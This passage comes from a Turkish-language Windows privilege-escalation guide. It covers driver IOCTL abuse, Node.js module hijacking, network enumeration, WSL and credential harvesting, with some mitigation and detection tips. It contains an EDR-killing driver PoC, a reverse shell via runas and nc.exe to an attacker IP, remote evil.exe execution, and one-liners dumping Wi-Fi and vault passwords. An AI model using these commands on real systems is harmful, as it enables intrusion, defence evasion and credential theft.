- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`’in bir `UNICODE_STRING`’i göstermesini bekler. Kod önce saldırganın denetimindeki bir `REG_DWORD` değerini stack’teki bir skaler değişkene yükler, ardından aynı buffer’ı bir string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini denetler ve `Buffer` pointer’ını kısmen etkileyerek kısmen denetlenen bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`’teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan skaler değişkende saldırganın denetimindeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın byte’larını doğrudan bitişik stack slot’larına kopyalar. Bu, çoğu zaman callback pointer’ın tamamını üzerine yazmanın en temiz yoludur.

Güçlü hunting pattern: **aynı stack değişkenine yeniden başlatmadan heterojen registry okumaları yapmak**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer’ları ve ilk registry okumasının ikinci okumanın gerçekleşip gerçekleşmeyeceğini belirlediği kod yolları için grep yapın.

#### Device object’lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver’lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object’lerini oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device ek bir bileşen içeren bir path üzerinden açılırken güvenli DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı şu tür bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir vaka)

Bir kullanıcı device’ı açabildiğinde, driver’ın sunduğu ayrıcalıklı IOCTL’ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Rastgele process’lere tam erişimli handle’lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk okuma/yazma (çevrimdışı tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil rastgele process’leri sonlandırma; kernel üzerinden user land’den AV/EDR kill işlemi yapmaya olanak tanır.

En basit PoC pattern’i (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltım önlemleri
- DACL ile kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (erişim maskeleri, METHOD_*, girdi doğrulama) kısıtlayın ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli aygıt adlarının (ör. \\ .\\amsdk*) kullanıcı modundan açılmasını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un savunmasız sürücü blocklist’ini (HVCI/WDAC/Smart App Control) etkinleştirin ve kendi izin/engelleme listelerinizi oluşturup güncel tutun.


## PATH DLL Hijacking

**PATH üzerindeki bir klasörde yazma izinleriniz** varsa, bir süreç tarafından yüklenen bir DLL’i ele geçirerek **ayrıcalıklarınızı yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Daha fazla bilgi için bu kontrolün nasıl kötüye kullanılabileceğine bakın:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import gerçekleştiren ve beklenen modülün **eksik** olduğu durumlarda **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows uncontrolled search path** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü kök dizinine kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu konumları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, buraya kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu hallerde yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` ile sarıp hata durumunda çalışmaya devam ettiğinde
- bir paket production derlemelerinden kaldırıldığında, paketleme sırasında atlandığında veya yüklenemediğinde
- güvenlik açığı içeren `require()` çağrısı ana uygulama kodunda değil, bağımlılık ağacının derinliklerinde yer aldığında

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef çalıştırılabilir dosyaya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı süreç) göre ayarlayın
- `Path` filtresini `node_modules` içeren yollarla sınırlayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketleri açılmış `.asar` dosyalarında veya uygulama kaynaklarında yararlı kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### İstismar

1. Procmon veya kaynak incelemesi aracılığıyla **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Tam olarak beklenen adla bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada kullanılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözeceği herhangi bir **eksik bare import** bulun.

### Tespit ve sağlamlaştırma fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlüklü süreçleri araştırın.
- Üretimde tüm çalışma zamanı bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` kalıplarını gözden geçirin.
- Kitaplık destekliyorsa isteğe bağlı yoklamaları devre dışı bırakın (örneğin, bazı `ws` dağıtımlarında `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` yoklaması önlenebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit olarak tanımlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **erişimi kısıtlanmış servisleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir dinleyici için PID'sini süreç sahibi, yürütülebilir dosyanın yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Uzaktan kontrol hizmeti, yalnızca kimlik doğrulama ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması, ayrı bir inceleme hedefidir: dinleyici ve ikili dosyanın yolu pasif ipuçlarıdır; kimlik doğrulaması gerektiren bir bellek bozulması yolunu doğrulamak için söz konusu ikili dosyanın ve erişilebilir girdisinin analiz edilmesi gerekir. Açığa açık bir bağlantı noktası bir sistem sürecine ait görünüyorsa, arka uç hizmetini belirlemeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

`bash.exe` binary dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

Root kullanıcıya erişirseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc` uygulamasına güvenlik duvarı izni verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator hakları sağlamaz. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; ayrıcalık yükseltme için yine de daha yüksek ayrıcalıklara sahip geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımı [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde bulunan düz metin bir bulgudur. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak depolayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve sıradan kayıt defteri okumaları, bu secret'ın mevcut olup olmadığını veya alınabilir olup olmadığını ortaya koymaz. Kimlik bilgilerinin açığa çıktığını raporlamadan önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunucular, web siteleri ve diğer programlara ait kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini depolayıp tarayıcıların otomatik olarak oturum açmasını sağlayabilecekleri anlamına geliyor gibi görünebilir, ancak çalışma şekli bu değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar. Bu da, bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının**, kullanıcıların her seferinde kullanıcı adı ve parola girmesi yerine, **bu Credential Manager ve Windows Vault'u kullanarak** sağlanan kimlik bilgilerinden yararlanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynak için depolanan kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan ilgili kaynağın kimlik bilgilerini istemek için bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama belirteçlerini ve düz metin parolaları Evrensel Windows Platformu (UWP) `PasswordVault` içinde saklar (`vaultcmd` içinde `Web Credentials` olarak da görüntülenir). Bu depolama alanı oturum bazında yalıtılmıştır ve yönetici ya da `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Kayıtlı tüm kullanıcı adlarını ve düz metin parolaları anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesini sağlayan bir yöntemdir ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi senaryolarında sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey`'i uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için kullanabilirsiniz.

**Ana parolayla korunan kimlik bilgisi dosyaları** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` komutunu uygun `/masterkey` ile kullanarak şifreyi çözebilirsiniz.\
(root iseniz) `sekurlsa::dpapi` modülüyle **memory**'den birçok DPAPI **masterkey**'i **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini kullanışlı bir şekilde saklamak için sıklıkla **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılan bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` dizininde olduğunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli izinlere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyadan PS credentials'ı **decrypt** etmek için şunu kullanabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` altında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **.rdg dosyalarının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **çok sayıda DPAPI masterkey** çıkarabilirsiniz

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcı Belgeleri altındaki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğeleri içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, kimlik bilgisi adayı olarak değerlendirin: [üretici notlarına](https://www.donkz.nl/) göre profil koruması oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek şekilde yapılandırılabilir. Bu bilgiye güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

İnsanlar bazen parolaları ve diğer bilgileri yapışkan not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil olmak üzere başka kullanıcı profili depoları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığına kanıt saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyalanması yakın zamanda tamamlanan notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla eşleşen `plum.sqlite-wal` dosyasını da saklayın ve varsa `plum.sqlite-shm` dosyasını ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola yeniden kullanımını ayrı ayrı doğrulayın. Şifrelenmiş bir parola yöneticisi kaydı, daha yüksek ayrıcalıklı bir oturum açmayı doğrulamadan önce ayrıca gerçek şifre çözme anahtarını ve uygulamaya özgü yorumlamayı gerektirir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin .\
Installer'lar **SYSTEM ayrıcalıklarıyla çalıştırılır** ve birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarlarında parola ile ilgili değer adlarını saklar. Örneğin, TeamViewer'ın `SecurityPasswordAES` değeri, [üreticinin kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre 9. sürümden önceki sürümlerde yapılandırılmış statik bir oturum parolasını gösteriyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisini değerlendirirken yüklü sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılıyor olması ve söz konusu hesap için yetkiniz bulunması gerekir. Şifreli metni ve kurtarılan parolaları rutin numaralandırma çıktısına eklemeyin.

### Korunan sayfalar içeren paylaşılan elektronik tablolar

